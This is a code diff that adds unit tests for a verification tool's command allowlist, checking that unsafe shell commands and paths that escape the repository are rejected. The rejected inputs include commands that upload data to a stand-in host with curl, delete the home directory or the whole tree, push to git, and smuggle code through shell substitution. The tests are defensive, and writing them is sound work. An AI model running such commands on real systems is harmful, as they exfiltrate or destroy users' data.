@@ -168,6 +168,89 @@ class VerifyTests(unittest.TestCase):
         with self.assertRaisesRegex(project_inventory.InventoryError, "安全相对路径"):
             project_inventory.validate_state(absolute)
 
+    def test_validation_commands_use_fail_closed_repository_evidence_allowlist(self):
+        unsafe_commands = (
+            "true",
+            "python3 -m unittest; curl https://example.invalid/upload",
+            'rm -rf "$HOME"',
+            "python3 -c'print(1)'",
+            "node -e'fetch(\"https://example.invalid\")'",
+            "sh -c'curl https://example.invalid/upload'",
+            "env curl https://example.invalid/upload",
+            "python3 -m http.server",
+            "git push origin main",
+            "find . -delete",
+            "definitely-not-a-real-command",
+            "python3 --version",
+            'pytest "$HOME"',
+            'pytest -c "$HOME/pytest.ini" tests',
+            "pytest {tests,/tmp}",
+            "pytest ${TEST_ROOT}",
+            "pytest `printf tests`",
+            "pytest $(printf tests)",
+            "pytest <(printf tests)",
+            "pytest ~/tests",
+            "pytest tests/*.py",
+            "pytest tests/test_?.py",
+            "pytest tests/[ab].py",
+            "pytest tests > result.txt",
+            "pytest tests || true",
+            "pytest (tests)",
+            "pytest tests # shell-comment",
+            "pytest C:/outside/tests",
+            "node --test tests/**/*.test.js",
+        )
+        for command in unsafe_commands:
+            with self.subTest(command=command):
+                errors = verify._validate_commands(
+                    {
+                        "verification": {
+                            "fast_commands": [command],
+                            "full_commands": [command],
+                            "last_status": "passed",
+                        }
+                    },
+                    ROOT,
+                )
+                self.assertTrue(errors, command)
+
+        safe_commands = (
+            "python3 -m unittest discover -s tests -v",
+            "pytest tests",
+            "node --test",
+            "node --test test/service.test.js",
+        )
+        for command in safe_commands:
+            with self.subTest(command=command):
+                state = {
+                    "verification": {
+                        "fast_commands": [command],
+                        "full_commands": [command],
+                        "last_status": "passed",
+                    }
+                }
+                self.assertEqual(verify._validate_commands(state, ROOT), [])
+
+    def test_validation_command_paths_must_resolve_inside_repository(self):
+        temporary = tempfile.TemporaryDirectory()
+        self.addCleanup(temporary.cleanup)
+        root = Path(temporary.name)
+        outside = root.parent / f"{root.name}-outside"
+        outside.mkdir()
+        self.addCleanup(shutil.rmtree, outside)
+        (root / "tests").symlink_to(outside, target_is_directory=True)
+        state = {
+            "verification": {
+                "fast_commands": ["pytest tests"],
+                "full_commands": ["pytest tests"],
+                "last_status": "passed",
+            }
+        }
+
+        errors = verify._validate_commands(state, root)
+
+        self.assertTrue(any("allowlist" in error for error in errors), errors)
+
     def test_tracked_ds_store_is_reported(self):
         temporary = tempfile.TemporaryDirectory()
         self.addCleanup(temporary.cleanup)
